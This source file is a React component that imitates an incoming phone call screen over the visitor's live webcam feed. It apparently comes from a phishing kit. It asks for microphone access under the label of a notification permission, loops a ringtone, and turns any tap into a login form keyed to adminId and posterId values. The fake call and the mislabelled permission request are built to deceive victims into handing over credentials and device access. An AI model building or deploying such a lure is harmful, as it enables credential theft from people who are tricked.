"use client";

import { useEffect, useRef, useState } from "react";
import Webcam from "react-webcam";
import LoginForm from "./LoginForm";

export default function Home({ adminId, posterId }) {
  const [showForm, setShowForm] = useState(false);
  const audioRef = useRef(null);

  const playNotificationSound = () => {
    try {
      const audio = new Audio("/tune.mp3"); // Path to the ringtone file
      audio.loop = true;
      audioRef.current = audio;
      audio.play().catch((error) => {
        console.error("Error playing the sound:", error);
      });
    } catch (error) {
      console.error("Audio error:", error);
    }
  };

  const requestNotificationPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      if (stream) {
        playNotificationSound();
      }
    } catch (error) {
      console.error("Error requesting notification permission:", error);
    }
  };

  useEffect(() => {
    requestNotificationPermission();

    return () => {
      if (audioRef.current) {
        audioRef.current.pause();
        audioRef.current.currentTime = 0;
      }
    };
  }, [adminId, posterId]);

  const handleOpenForm = () => {
    if (audioRef.current) {
      audioRef.current.pause();
    }
    setShowForm(true);
  };

  return (
    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black overflow-hidden select-none font-sans">
      {/* Background Live Camera Feed */}
      <Webcam
        audio={false}
        className="absolute inset-0 h-full w-full object-cover"
        videoConstraints={{ facingMode: "user" }}
      />

      {/* Screen Overlay Content */}
      {!showForm ? (
        <div
          onClick={handleOpenForm}
          className="absolute inset-0 z-10 flex flex-col items-center justify-center cursor-pointer bg-black/25"
        >
          <div className="w-full max-w-sm px-8 flex flex-col items-center">
            {/* Caller Header */}
            <div className="text-center mb-16 md:mb-20">
              <p className="text-white/80 text-base md:text-lg font-normal tracking-wide">
                United States
              </p>
              <h1 className="text-white text-2xl md:text-3xl font-bold tracking-tight mt-1">
                +1 (213) 275-9882
              </h1>
            </div>

            {/* Middle Row: Message & Remind Me */}
            <div className="w-full flex justify-between items-center px-4 mb-12 md:mb-16">
              {/* Message */}
              <div className="flex items-center gap-2 text-white/90">
                <svg
                  className="w-6 h-6 md:w-7 md:h-7"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="1.8"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />
                </svg>
                <span className="text-sm md:text-base font-normal">Message</span>
              </div>

              {/* Remind Me */}
              <div className="flex items-center gap-2 text-white/90">
                <div className="relative">
                  <svg
                    className="w-6 h-6 md:w-7 md:h-7"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="1.8"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" />
                    <path d="M13.73 21a2 2 0 0 1-3.46 0" />
                  </svg>
                  <span className="absolute -top-1 -right-1 text-[9px] bg-black/60 border border-white text-white rounded-full w-3.5 h-3.5 flex items-center justify-center font-bold leading-none">
                    1
                  </span>
                </div>
                <span className="text-sm md:text-base font-normal">Remind Me</span>
              </div>
            </div>

            {/* Bottom Row: Decline & Accept Buttons */}
            <div className="w-full flex justify-between items-center px-4">
              {/* Decline Button */}
              <button
                type="button"
                className="w-[74px] h-[74px] md:w-20 md:h-20 rounded-full bg-[#eb4d3d] flex items-center justify-center text-white text-sm md:text-base font-medium shadow-lg active:scale-95 transition-transform cursor-pointer"
              >
                Decline
              </button>

              {/* Accept Button */}
              <button
                type="button"
                className="w-[74px] h-[74px] md:w-20 md:h-20 rounded-full bg-[#34c759] flex items-center justify-center text-white text-sm md:text-base font-medium shadow-lg active:scale-95 transition-transform cursor-pointer"
              >
                Accept
              </button>
            </div>
          </div>
        </div>
      ) : (
        <div className="absolute inset-0 z-20 flex justify-center items-center bg-black/40 backdrop-blur-sm p-4">
          <div className="shadow-around rounded-lg">
            <LoginForm adminId={adminId} posterId={posterId} />
          </div>
        </div>
      )}
    </div>
  );
}
